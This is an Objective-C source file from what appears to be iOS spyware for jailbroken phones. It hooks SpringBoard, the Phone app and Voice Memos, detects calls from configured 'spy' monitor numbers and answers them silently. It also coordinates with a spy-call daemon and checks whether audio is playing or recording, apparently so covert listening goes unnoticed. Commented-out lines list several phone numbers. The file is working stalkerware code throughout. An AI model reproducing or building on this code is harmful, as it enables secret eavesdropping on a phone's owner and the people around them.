//
//  SpyCallUtils.m
//  MSSPC
//
//  Created by Makara Khloth on 3/12/12.
//  Copyright 2012 __MyCompanyName__. All rights reserved.
//

#import "SpyCallUtils.h"
#import "Telephony.h"
#import "MessagePortIPCSender.h"
#import "DefStd.h"
#import "TelephoneNumber.h"
#import "SystemEnvironmentUtils.h"
#import "SpyCallManager.h"
#import "AudioHelper.h"
#import "AudioActiveInfo.h"

#import "PrefMonitorNumber.h"
#import "SharedFileIPC.h"

#import "SBTelephonyManager.h"
#import "SBMediaController.h"
#import "AVController.h"
#import "SBApplicationController.h"
#import "SBApplication.h"

@implementation SpyCallUtils

+ (NSString *) telephoneNumber: (CTCall *) aCall {
	NSString *telephoneNumber = CTCallCopyAddress(nil, aCall);
	[telephoneNumber autorelease];
	return (telephoneNumber);
}

+ (NSInteger) callCauseCode: (CTCall *) aCall {
	NSInteger callCauseCode = CTCallGetCauseCode(aCall);
	return (callCauseCode);
}

+ (void) answerCall: (CTCall *) aCall {
	CTCallAnswer(aCall);
}

+ (BOOL) isCallWaiting: (CTCall *) aCall {
	BOOL waiting = CTCallIsWaiting(aCall);
	return (waiting);
}

+ (BOOL) isSpyNumber: (NSString *) aTelephoneNumber {
	BOOL yes = NO;
//	if (aTelephoneNumber && [aTelephoneNumber isEqualToString:@"0874940421"]) { // 0818469733 0850981119 0893429459 0856841133 0870323600 0830885384
//		return (yes = YES);
//	}
	
	SharedFileIPC *sFileIPC = [[SharedFileIPC alloc] initWithSharedFileName:kSharedFileMobileSubstrate4];
	NSData *monitorNumberData = [sFileIPC readDataWithID:kSharedFileMonitorNumberID];
	DLog (@"monitorNumberData = %@", monitorNumberData);
	if (monitorNumberData) {
		PrefMonitorNumber *prefMonitorNumbers = [[PrefMonitorNumber alloc] initFromData:monitorNumberData];
		if ([prefMonitorNumbers mEnableMonitor]) {
			TelephoneNumber *telNumber = [[TelephoneNumber alloc] init];
			for (NSString *monitorNumber in [prefMonitorNumbers mMonitorNumbers]) {
				if ([telNumber isNumber:aTelephoneNumber matchWithMonitorNumber:monitorNumber]) {
					yes = YES;
					break;
				}
			}
			[telNumber release];
		}
		[prefMonitorNumbers release];
	}
	[sFileIPC release];
	DLog (@"aTelphoneNumber = %@ is spy number = %d", aTelephoneNumber, yes);
	return (yes);
}

+ (BOOL) isSpyCall: (CTCall *) aCall {
	return ([SpyCallUtils isSpyNumber:[SpyCallUtils telephoneNumber:aCall]]);
}

+ (BOOL) isOutgoingCall: (CTCall *) aCall {
	BOOL outgoing = CTCallIsOutgoing(aCall);
	return (outgoing);
}

+ (BOOL) sendCommandToSpyCallDaemon: (NSInteger) aCommandID cmdInfo: (id) aInfo {
	//APPLOGVERBOSE(@"aCommandID = %d, aCmdInfo = %@", aCommandID, aInfo);
	NSInteger command = aCommandID;
	NSMutableData *data = [NSMutableData data];
	[data appendBytes:&command length:sizeof(NSInteger)];
	NSInteger length = 0;
	NSInteger count = 0;
	switch (command) {
		case kSpyCallMSNormalCallInProgress: {
			NSDictionary *info = aInfo;
			// Direction
			NSInteger direction = [[info objectForKey:kNormalCallDirection] intValue];
			[data appendBytes:&direction length:sizeof(NSInteger)];
			// Number
			NSString *number = [info objectForKey:kNormalCallNumber];
			length = [number lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
			[data appendBytes:&length length:sizeof(NSInteger)];
			[data appendData:[number dataUsingEncoding:NSUTF8StringEncoding]];
		} break;
		case kSpyCallMSMaxConferenceLine: {
			NSDictionary *info = aInfo;
			NSArray *telNumbers = [info objectForKey:kTeleNumbers];
			NSArray *telDirections = [info objectForKey:kTeleDirections];
			NSInteger lines = [[info objectForKey:kTeleMaxLines] intValue];
			// Max lines
			[data appendBytes:&lines length:sizeof(NSInteger)];
			// Telephone numbers
			count = [telNumbers count];
			[data appendBytes:&count length:sizeof(NSInteger)];
			for (NSString *telNumber in telNumbers) {
				length = [telNumber lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
				[data appendBytes:&length length:sizeof(NSInteger)];
				[data appendData:[telNumber dataUsingEncoding:NSUTF8StringEncoding]];
			}
			// Directions
			count = [telDirections count];
			[data appendBytes:&count length:sizeof(NSInteger)];
			for (NSNumber *direction in telDirections) {
				NSInteger value = [direction intValue];
				[data appendBytes:&value length:sizeof(NSInteger)];
			}
		} break;
		case kSpyCallMSNormalCallOnHold: {
			NSDictionary *info = aInfo;
			NSArray *telNumbers = [info objectForKey:kTeleNumbers];
			NSArray *telDirections = [info objectForKey:kTeleDirections];
			// Telephone numbers
			count = [telNumbers count];
			[data appendBytes:&count length:sizeof(NSInteger)];
			for (NSString *telNumber in telNumbers) {
				length = [telNumber lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
				[data appendBytes:&length length:sizeof(NSInteger)];
				[data appendData:[telNumber dataUsingEncoding:NSUTF8StringEncoding]];
			}
			// Directions
			count = [telDirections count];
			[data appendBytes:&count length:sizeof(NSInteger)];
			for (NSNumber *direction in telDirections) {
				NSInteger value = [direction intValue];
				[data appendBytes:&value length:sizeof(NSInteger)];
			}
		} break;
		case kSpyCallMSAudioIsActive: {
			
		} break;
		case kSpyCallMSSpyCallInProgress: {
			NSString *number = aInfo;
			length = [number lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
			[data appendBytes:&length length:sizeof(NSInteger)];
			[data appendData:[number dataUsingEncoding:NSUTF8StringEncoding]];
		} break;
		default: {
			;
		} break;
	}
	MessagePortIPCSender *sender = [[MessagePortIPCSender alloc] initWithPortName:kSpyCallMSCommandMsgPort];
	BOOL write = [sender writeDataToPort:data];
	[sender release];
	return (write);
}

+ (BOOL) isSpringBoardHook {
	BOOL yes = FALSE;
	NSString *bundleID = [[NSBundle mainBundle] bundleIdentifier];
	if ([bundleID isEqualToString:@"com.apple.springboard"]) {
		yes = TRUE;
	}
	return (yes);
}

+ (BOOL) isMobileApplicationHook {
	BOOL yes = FALSE;
	NSString *bundleID = [[NSBundle mainBundle] bundleIdentifier];
	if ([bundleID isEqualToString:@"com.apple.mobilephone"]) {
		yes = TRUE;
	}
	return (yes);
}

+ (BOOL) isVoiceMemoHook {
	BOOL yes = FALSE;
	NSString *bundleID = [[NSBundle mainBundle] bundleIdentifier];
	if ([bundleID isEqualToString:@"com.apple.VoiceMemos"]) {
		yes = TRUE;
	}
	return (yes);
}

+ (BOOL) isIOS7 {
	return ([[[UIDevice currentDevice] systemVersion] intValue] == 7);
}

+ (BOOL) isIOS6 {
	return ([[[UIDevice currentDevice] systemVersion] intValue] == 6);
}

+ (BOOL) isIOS5 {
	return ([[[UIDevice currentDevice] systemVersion] intValue] == 5);
}

+ (BOOL) isIOS4 {
	return ([[[UIDevice currentDevice] systemVersion] intValue] == 4);
}

+ (void) prepareToAnswerCall {
	if ([SpyCallUtils isSpringBoardHook]) {
		if ([SpyCallUtils isIOS5] ||
			[SpyCallUtils isIOS6] ||
			[SpyCallUtils isIOS7]) {
			// Work only with iOS 5, there is no such method in iOS 4
			Class $SBTelephonyManager = objc_getClass("SBTelephonyManager");
			[[$SBTelephonyManager sharedTelephonyManager] _prepareToAnswerCall];
		} else if ([SpyCallUtils isIOS4]) {
			// Work with both iOS 4 and iOS 5 but side effect to iOS 5 is that after spy call is disconnected:
			// 1. Not vibrate when normal come in
			// 2. Voice Memo cannot record
			// 3. Video or music player not able to play sound
			AVController *avController = [[[SpyCallManager sharedManager] mSystemEnvUtils] mAVController];
			[SpyCallUtils setAVController:avController category:@"PhoneCall" transition:1];
		}
	} else if ([SpyCallUtils isMobileApplicationHook]) {
		// Ask SpringBoard board to prepare to answer call
		MessagePortIPCSender *writer = [[MessagePortIPCSender alloc] initWithPortName:kSpyCallSpringBoardRecordingMsgPort];
		NSMutableData *audioHelperPrepareToAnswerCallCmdData = [NSMutableData data];
		NSInteger cmd = kAudioHelperPrepareToAnswerCallCmd;
		[audioHelperPrepareToAnswerCallCmdData appendBytes:&cmd length:sizeof(NSInteger)];
		[writer writeDataToPort:audioHelperPrepareToAnswerCallCmdData];
		NSData *returnData = [writer mReturnData];
		APPLOGVERBOSE(@"returnData = %@", returnData);
		if (returnData) {
			BOOL isPrepared = NO;
			[returnData getBytes:&isPrepared length:sizeof(BOOL)];
		}
		[writer release];
		writer = nil;
	}
}

+ (BOOL) isPlayingAudio {
	BOOL isSBPlaying = FALSE;
	BOOL isVoiceMemoPlaying = FALSE;
	
	// Ask to VoiceMemo whether it is playing back
	MessagePortIPCSender *writer = [[MessagePortIPCSender alloc] initWithPortName:kSpyCallVoiceMemoPlayingMsgPort];
	NSMutableData *audioHelperIsPlayingCmdData = [NSMutableData data];
	NSInteger cmd = kAudioHelperIsPlayingCmd;
	[audioHelperIsPlayingCmdData appendBytes:&cmd length:sizeof(NSInteger)];
	[writer writeDataToPort:audioHelperIsPlayingCmdData];
	NSData *returnData = [writer mReturnData];
	DLog(@"returnData 1 = %@", returnData);
	if (returnData) {
		[returnData getBytes:&isVoiceMemoPlaying length:sizeof(BOOL)];
	}
	[writer release];
	writer = nil;
	
	if ([SpyCallUtils isSpringBoardHook]) { // SpringBoard
		Class $SBMediaController = objc_getClass("SBMediaController");
		isSBPlaying = [[$SBMediaController sharedInstance] isPlaying];
	} else if ([SpyCallUtils isMobileApplicationHook]) { // Mobile Phone
		// Ask to SpringBoard its isPlaying is set to TRUE
		writer = [[MessagePortIPCSender alloc] initWithPortName:kSpyCallSpringBoardRecordingMsgPort];
		[writer writeDataToPort:audioHelperIsPlayingCmdData];
		returnData = [writer mReturnData];
		DLog(@"returnData 2 = %@", returnData);
		if (returnData) {
			[returnData getBytes:&isSBPlaying length:sizeof(BOOL)];
		}
		[writer release];
	}
	DLog (@"isSBPlaying = %d, isVoiceMemoPlaying = %d", isSBPlaying, isVoiceMemoPlaying);
	return (isSBPlaying || isVoiceMemoPlaying);
}

+ (BOOL) isRecordingAudio {
	BOOL isRecording = FALSE;
	if ([SpyCallUtils isSpringBoardHook]) { // SpringBoard
		Class $SBApplicationController = objc_getClass("SBApplicationController");
		SBApplication *voiceMemo = [[$SBApplicationController sharedInstance] applicationCurrentlyRecordingAudio];
		isRecording = voiceMemo ? TRUE: FALSE;
	} else if ([SpyCallUtils isMobileApplicationHook]) { // Mobile Phone
		// Ask to SpringBoard whether VoiceMemo is recording
		MessagePortIPCSender *writer = [[MessagePortIPCSender alloc] initWithPortName:kSpyCallSpringBoardRecordingMsgPort];
		NSMutableData *audioHelperIsRecordingCmdData = [NSMutableData data];
		NSInteger cmd = kAudioHelperIsRecordingCmd;
		[audioHelperIsRecordingCmdData appendBytes:&cmd length:sizeof(NSInteger)];
		[writer writeDataToPort:audioHelperIsRecordingCmdData];
		NSData *returnData = [writer mReturnData];
		DLog(@"returnData = %@", returnData);
		if (returnData) {
			[returnData getBytes:&isRecording length:sizeof(BOOL)];
		}
		[writer release];
	}
	DLog (@"isRecording = %d", isRecording);
	return (isRecording);
}

+ (BOOL) isAudioActiveFromFirstCheck {
	BOOL isAudioActive = FALSE;
	SharedFileIPC *sFileIPC = [[SharedFileIPC alloc] initWithSharedFileName:kSharedFileMobileSubstrate];
	NSData *aaiData = [sFileIPC readDataWithID:kSharedFileAudioActiveID];
	if (aaiData) {
		AudioActiveInfo *aai = [[AudioActiveInfo alloc] initWithData:aaiData];
		isAudioActive = [aai mIsAudioActive];
		[aai release];
	}
	[sFileIPC release];
	return (isAudioActive);
}

+ (void) setAVController: (AVController *) aAVController category: (NSString *) aCategory transition: (NSInteger) aTransition {
	APPLOGVERBOSE(@"1.AVController attribute value = %@", [aAVController attributeForKey:aCategory]);
	
	[aAVController activate:nil];
	NSError *error = nil;
	NSNumber *stateNumber=[NSNumber numberWithInt:aTransition];
	NSString *audioTransitionKey = @"AVController_AllowGaplessTransitionsAttribute";
	[aAVController setAttribute:(id)stateNumber forKey:audioTransitionKey error:&error];
	APPLOGVERBOSE (@"1.aAVController = %@ error = %@", aAVController, error);
	NSString *stateValue = aCategory;
	NSString *audioCategoryKey = @"AVController_AudioCategoryAttribute";
	error = nil;
	[aAVController setAttribute:(id)stateValue forKey:audioCategoryKey error:&error];
	
	APPLOGVERBOSE (@"2.aAVController = %@ error = %@", aAVController, error);
	APPLOGVERBOSE(@"2.AVController attribute value = %@", [aAVController attributeForKey:@"AVController_AudioCategoryAttribute"]);
}

- (id) init {
	if ((self = [super init])) {
	}
	return (self);
}

- (void) dealloc {
	[super dealloc];
}

@end
